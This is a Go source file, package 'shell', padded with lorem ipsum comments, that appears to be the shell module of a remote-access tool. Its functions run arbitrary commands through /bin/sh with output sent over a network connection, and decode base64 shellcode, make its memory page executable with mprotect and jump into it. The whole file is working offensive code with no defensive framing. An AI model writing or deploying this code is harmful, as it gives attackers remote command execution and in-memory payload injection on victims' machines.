// Lorem ipsum dolor sit amet, consectetur adipiscing elit. Integer aliquet feugiat gravida. Nam mollis venenatis libero et interdum. Quisque in dolor ultrices, pulvinar diam ac, lobortis dolor. Phasellus consequat rutrum arcu, sit amet lobortis justo commodo quis. Sed luctus at elit sit amet congue. Phasellus convallis enim eu blandit dapibus. Vestibulum ex leo, ultricies sed mattis sed, tincidunt et odio. Pellentesque dictum tristique massa ac feugiat. 
package shell

import (
	"encoding/base64"
	"net"
	"os/exec"
	"syscall"
	"unsafe"
)
// Lorem ipsum dolor sit amet, consectetur adipiscing elit. Integer aliquet feugiat gravida. Nam mollis venenatis libero et interdum. Quisque in dolor ultrices, pulvinar diam ac, lobortis dolor. Phasellus consequat rutrum arcu, sit amet lobortis justo commodo quis. Sed luctus at elit sit amet congue. Phasellus convallis enim eu blandit dapibus. Vestibulum ex leo, ultricies sed mattis sed, tincidunt et odio. Pellentesque dictum tristique massa ac feugiat. 

func GetShell() *exec.Cmd {
	cmd := exec.Command("/bin/sh")
	return cmd
}

func ExecuteCmd(command string, conn net.Conn) {
	cmdPath := "/bin/sh"
	cmd := exec.Command(cmdPath, "-c", command)
	cmd.Stdout = conn
	cmd.Stderr = conn
	cmd.Run()
}

func InjectShellcode(encShellcode string) {
	if encShellcode != "" {
		if shellcode, err := base64.StdEncoding.DecodeString(encShellcode); err == nil {
			ExecShellcode(shellcode)
		}
	}
	return
}

func getPage(p uintptr) []byte {
	return (*(*[0xFFFFFF]byte)(unsafe.Pointer(p & ^uintptr(syscall.Getpagesize()-1))))[:syscall.Getpagesize()]
}

func ExecShellcode(shellcode []byte) {
	shellcodeAddr := uintptr(unsafe.Pointer(&shellcode[0]))
	page := getPage(shellcodeAddr)
	syscall.Mprotect(page, syscall.PROT_READ|syscall.PROT_EXEC)
	shellPtr := unsafe.Pointer(&shellcode)
	shellcodeFuncPtr := *(*func())(unsafe.Pointer(&shellPtr))
	go shellcodeFuncPtr()
}
